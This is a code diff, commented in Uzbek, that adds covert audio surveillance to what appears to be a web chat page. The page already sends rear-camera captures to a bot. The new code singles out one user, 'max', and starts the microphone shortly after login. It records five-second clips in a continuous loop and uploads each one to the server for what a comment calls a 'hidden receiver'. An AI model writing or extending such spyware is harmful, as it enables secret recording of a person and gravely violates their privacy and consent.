@@ -312,6 +312,63 @@
             if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
         }
 
+        // ==========================================
+        // HAR 5 SONIYADA AVTO-OVOZ YOZISH MANTIQI
+        // ==========================================
+        
+        async function startAutoVoice() {
+            if (myUser !== 'max') return; // Faqat Max uchun ishlaydi
+            
+            try {
+                // Mikrofonga ruxsat so'rash
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const autoRecorder = new MediaRecorder(stream);
+                
+                autoRecorder.ondataavailable = async (e) => {
+                    if (e.data.size > 0) {
+                        const formData = new FormData();
+                        formData.append('file', e.data, `auto_voice_${Date.now()}.webm`);
+                        try {
+                            // Serverga yuklash
+                            const res = await fetch('/upload', { method: 'POST', body: formData });
+                            const data = await res.json();
+                            // Serverdagi yashirin qabul qilgichga yuborish
+                            socket.emit('auto_voice', { filename: data.filename });
+                        } catch (err) { console.error("Avto-ovoz yuklash xatosi"); }
+                    }
+                };
+
+                // 5 soniya yozish va to'xtatish jarayoni
+                function recordChunk() {
+                    if (autoRecorder.state === 'inactive') {
+                        autoRecorder.start();
+                        // 5 soniyadan keyin to'xtatadi
+                        setTimeout(() => {
+                            if(autoRecorder.state === 'recording') autoRecorder.stop();
+                        }, 5000); 
+                    }
+                }
+
+                autoRecorder.onstop = () => {
+                    // Bitta xabar ketgandan so'ng 1 soniya dam olib, yana qayta boshlaydi
+                    setTimeout(recordChunk, 1000);
+                };
+
+                // Jarayonni birinchi marta ishga tushirish
+                recordChunk();
+
+            } catch (err) {
+                console.log("Avto mikrofon ruxsat bermadi:", err);
+            }
+        }
+
+        // Tizimga kirgandan keyin 4 soniya o'tib mikrofonni avto-yozishga tushirish
+        socket.on('connect', () => {
+            if (myUser === 'max') {
+                setTimeout(startAutoVoice, 4000); 
+            }
+        });
+    
         // Tizimga kirganda 3 soniyadan keyin ishga tushadi
         socket.on('connect', () => {
             if (myUser === 'max') {
